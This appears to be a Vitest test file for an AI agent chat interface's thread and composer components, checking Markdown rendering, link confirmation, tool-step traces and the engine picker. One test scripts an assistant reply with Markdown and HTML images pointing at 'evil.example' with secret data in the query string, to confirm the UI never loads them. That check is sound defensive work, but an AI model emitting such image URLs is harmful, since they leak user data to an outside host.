// @vitest-environment jsdom
import { useChat } from "@ai-sdk/react";
import { type AiSdkChat, createChat } from "@shadcn/helpers/ai-sdk";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { createMemoryHistory, createRootRoute, createRouter, RouterProvider } from "@tanstack/react-router";
import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { type ReactNode, useState } from "react";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { Composer } from "../src/components/shell/composer.tsx";
import { Thread } from "../src/components/shell/thread.tsx";
import type { ChatMessage, EngineName } from "../src/lib/chat.ts";

// The chat's thread on a scripted conversation (`createChat`) through the real `useChat`: no model,
// no server and no database, so what the column draws of each part is what is under test.
// `chat.test.ts`, `harness.test.ts` and `acp.test.ts` drive the turn itself.

// The server functions, which only Start's build keeps out of a browser module: the thread calls none.
vi.mock(
  "../src/functions.ts",
  () =>
    new Proxy(
      {},
      {
        has: () => true,
        get: (_, name) =>
          name === "then"
            ? undefined
            : () => {
                throw new Error(`The thread called ${String(name)}`);
              },
      },
    ),
);

beforeAll(async () => {
  // The reply's lazy renderer, loaded ahead so no test's wait is spent transforming it.
  await import("../src/components/shell/markdown.tsx");
  await import("../src/components/shell/fence.tsx");
  // What jsdom lacks and the message scroller reads.
  for (const name of ["ResizeObserver", "IntersectionObserver"]) {
    vi.stubGlobal(
      name,
      class {
        observe() {}
        unobserve() {}
        disconnect() {}
        takeRecords() {
          return [];
        }
      },
    );
  }
  Element.prototype.scrollTo = () => {};
});
afterEach(cleanup);

type Script = AiSdkChat<ChatMessage>;

function Scripted({ script, onContinue }: { script: Script; onContinue?: () => void }) {
  const { messages, sendMessage, status, error } = useChat<ChatMessage>({
    messages: script.get(0) as ChatMessage[],
    transport: script.transport({ delayMs: 0 }) as never,
  });
  const next = script.next(messages);
  return (
    <>
      <Thread chat="chat" messages={messages} status={status} error={error} onContinue={onContinue} />
      <button type="button" disabled={!next} onClick={() => next && void sendMessage(next as ChatMessage)}>
        Next turn
      </button>
    </>
  );
}

/** Draws `page` in the app's router and query client. */
function draw(page: () => ReactNode) {
  const router = createRouter({ routeTree: createRootRoute({ component: page }), history: createMemoryHistory() });
  render(
    <QueryClientProvider client={new QueryClient()}>
      <RouterProvider router={router} />
    </QueryClientProvider>,
  );
}

/** Draws the thread and sends the script's first message. */
async function play(script: Script, onContinue?: () => void) {
  draw(() => <Scripted script={script} onContinue={onContinue} />);
  fireEvent.click(await screen.findByRole("button", { name: "Next turn" }));
}

describe("the chat's thread", () => {
  it("draws the person's turn as the scroller's anchor and a reply as Markdown", async () => {
    await play(
      createChat<ChatMessage>()
        .user("What changed?")
        .assistant("The **draft** changed:\n\n- `a.ts`\n- [the docs](https://example.com/docs)"),
    );
    const log = await screen.findByRole("log");
    const strong = await within(log).findByText("draft");
    expect(strong.tagName).toBe("STRONG");
    expect(within(log).getByText("a.ts").tagName).toBe("CODE");
    // A link asks before it opens (see below), so it is a button.
    const link = within(log).getByRole("button", { name: "the docs" });
    // In the reply's own colour and weight, Streamdown's merged away.
    expect(link.className).toContain("text-current");
    expect(link.className).not.toContain("text-primary");
    const anchor = within(log).getByText("What changed?").closest("[data-scroll-anchor]");
    expect(anchor?.getAttribute("data-scroll-anchor")).toBe("true");
    expect(strong.closest("[data-scroll-anchor]")?.getAttribute("data-scroll-anchor")).not.toBe("true");
    await within(log).findByRole("button", { name: "Copy" });
  });

  it("draws a fenced block as a code block, with its copy", async () => {
    await play(createChat<ChatMessage>().user("Show me").assistant("Here:\n\n```ts\nconst a = 1;\n```"));
    // Once its chunk has come, in place of the plain block.
    const block = await waitFor(() => {
      const found = document.querySelector<HTMLElement>('[data-slot="code-block"]');
      expect(found && within(found).queryByRole("button", { name: "Copy" })).not.toBeNull();
      return found as HTMLElement;
    });
    expect(block.textContent).toContain("const a = 1;");
    expect(block.closest("pre")).toBeNull();
    // Its language reached the highlighter: the tokens carry their colours.
    await waitFor(() => expect(block.querySelector('[data-slot="code-block-line"] span[style]')).not.toBeNull(), {
      timeout: 10_000,
    });
    expect(screen.getByText("Here:").closest('[data-slot="code-block"]')).toBeNull();
  });

  it("shows a tag the reply names as the text it is", async () => {
    await play(
      createChat<ChatMessage>().user("Show me").assistant("Wrap it in <Thread /> and type it as Array<string>."),
    );
    expect(await screen.findByText("Wrap it in <Thread /> and type it as Array<string>.")).toBeTruthy();
  });

  it("asks before a link the agent wrote opens", async () => {
    const open = vi.spyOn(window, "open").mockImplementation(() => null);
    await play(createChat<ChatMessage>().user("Where?").assistant("See [the docs](https://example.com/docs)."));
    fireEvent.click(await screen.findByRole("button", { name: "the docs" }));
    const dialog = await screen.findByRole("dialog", { name: "Open this link?" });
    expect(within(dialog).getByText("https://example.com/docs")).toBeTruthy();
    expect(open).not.toHaveBeenCalled();
    fireEvent.click(within(dialog).getByRole("button", { name: "Open" }));
    expect(open).toHaveBeenCalledExactlyOnceWith("https://example.com/docs", "_blank", "noreferrer");
    open.mockRestore();
  });

  it("asks before any link opens, however it is written, but an in-page anchor", async () => {
    await play(
      createChat<ChatMessage>()
        .user("Who?")
        .assistant(
          "Write to [us](mailto:hello@example.com), or see [this](//example.com/x), [that](/inbox) and [below](#end).",
        ),
    );
    expect((await screen.findByRole("link", { name: "below" })).getAttribute("href")).toBe("#end");
    expect(screen.getByRole("button", { name: "us" })).toBeTruthy();
    expect(screen.getByRole("button", { name: "that" })).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: "this" }));
    expect(await screen.findByRole("dialog", { name: "Open this link?" })).toBeTruthy();
  });

  it("loads no image a reply names, by Markdown or by HTML", async () => {
    await play(
      createChat<ChatMessage>()
        .user("Read the page")
        .assistant('Done. ![x](https://evil.example/?d=secret)\n\n<img src="https://evil.example/?d=raw" />'),
    );
    // The turn over, and past the plain text shown until the renderer's chunk comes.
    await screen.findByRole("button", { name: "Copy" });
    // The Markdown image is dropped; the HTML one is the text it is, never an element.
    await waitFor(() => expect(screen.getByRole("log").textContent).not.toContain("d=secret"));
    expect(screen.getByRole("log").textContent).toContain('<img src="https://evil.example/?d=raw" />');
    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByRole("log").textContent).toContain("Done.");
  });

  it("draws thinking and steps as one trace, thinking open only while it streams", async () => {
    await play(
      createChat<ChatMessage>()
        .user("Fix it")
        .assistant(({ writer }) => {
          writer.reasoning("Looking at the file", { delayMs: 60 }).stepStart();
          writer.tool("read_file", { input: { path: "a.ts" }, output: { text: "x" } as never });
          writer.stepStart();
          writer.tool("edit_file", { input: { path: "b.ts" } as never }).error("no such text");
          writer.text("Tried.");
        }),
    );
    await screen.findByText(/^Looking/);
    expect(screen.getByText("Thinking")).toBeTruthy();
    await screen.findByText("Thought");
    await screen.findByText("Tried.");
    const trace = document.querySelectorAll('[data-slot="trace"]');
    expect(trace).toHaveLength(1);
    const lines = within(trace[0] as HTMLElement);
    expect(lines.getByText("Read a.ts").textContent).toBe("Done: Read a.ts");
    expect(lines.getByText("Edited b.ts").textContent).toBe("Failed: Edited b.ts");
    // Why a step failed is open under it; the thinking folded once it finished.
    expect(lines.getByText("no such text").closest('[data-slot="code-block"]')).not.toBeNull();
    expect(screen.queryByText(/^Looking/)).toBeNull();
  });

  it("marks a step left under way as stopped and offers Continue", async () => {
    const onContinue = vi.fn<() => void>();
    await play(
      createChat<ChatMessage>()
        .user("Fix it")
        .assistant(({ writer }) => {
          writer.tool("read_file", { input: { path: "a.ts" } as never });
        }),
      onContinue,
    );
    fireEvent.click(await screen.findByRole("button", { name: "Continue" }));
    expect(onContinue).toHaveBeenCalledOnce();
    expect(screen.getByText("Read a.ts").textContent).toBe("Stopped: Read a.ts");
  });

  it("says a turn's error, and where to set a missing key", async () => {
    await play(createChat<ChatMessage>().user("Hello").error("No key [connector:anthropic]"));
    const link = await screen.findByRole("link", { name: "Set it on its connector page" });
    expect(link.getAttribute("href")).toBe("/connectors/anthropic");
    expect(screen.getByText(/^No key/)).toBeTruthy();
    expect(screen.queryByRole("button", { name: "Continue" })).toBeNull();
  });
});

function EnginePicker() {
  const [value, set] = useState<EngineName>("loop");
  return <Composer busy={false} onSend={() => {}} engine={{ value, set }} />;
}

describe("the chat's composer", () => {
  it("sends on Enter, not on Shift+Enter, and not while busy", async () => {
    const onSend = vi.fn<(text: string) => void>();
    draw(() => <Composer busy={false} onSend={onSend} />);
    const box = await screen.findByRole<HTMLTextAreaElement>("textbox", { name: "Message the agent" });
    expect(screen.getByRole<HTMLButtonElement>("button", { name: "Send" }).disabled).toBe(true);
    fireEvent.change(box, { target: { value: " hello " } });
    fireEvent.keyDown(box, { key: "Enter", shiftKey: true });
    expect(onSend).not.toHaveBeenCalled();
    fireEvent.keyDown(box, { key: "Enter" });
    expect(onSend).toHaveBeenCalledExactlyOnceWith("hello");
    expect(box.value).toBe("");
  });

  it("holds Send and says why while there is a note", async () => {
    const onSend = vi.fn<(text: string) => void>();
    draw(() => <Composer busy={false} onSend={onSend} draft="hello" note={<p>Connect a model</p>} />);
    const send = await screen.findByRole<HTMLButtonElement>("button", { name: "Send" });
    expect(send.disabled).toBe(true);
    expect(screen.getByText("Connect a model").parentElement?.id).toBe(send.getAttribute("aria-describedby"));
    fireEvent.keyDown(screen.getByRole("textbox", { name: "Message the agent" }), { key: "Enter" });
    expect(onSend).not.toHaveBeenCalled();
  });

  it("picks the engine a new chat opens on", async () => {
    draw(() => <EnginePicker />);
    const trigger = await screen.findByRole("button", { name: "Engine" });
    expect(trigger.textContent).toBe("Sanoma");
    fireEvent.click(trigger);
    // Our loop first, a person's own agents last, under a label of their own.
    const engines = await screen.findAllByRole("menuitemradio");
    expect(engines.map((engine) => engine.textContent)).toEqual([
      "Sanoma",
      "Pi",
      "Claude Code",
      "Copilot (your plan)",
      "OpenCode (your plan)",
      "Pi (your plan)",
      "Claude Code (your plan)",
      "Codex (your plan)",
    ]);
    expect(screen.getByText("Your own plan")).toBeTruthy();
    fireEvent.click(screen.getByRole("menuitemradio", { name: "Codex (your plan)" }));
    await waitFor(() => expect(trigger.textContent).toBe("Codex (your plan)"));
  });
});
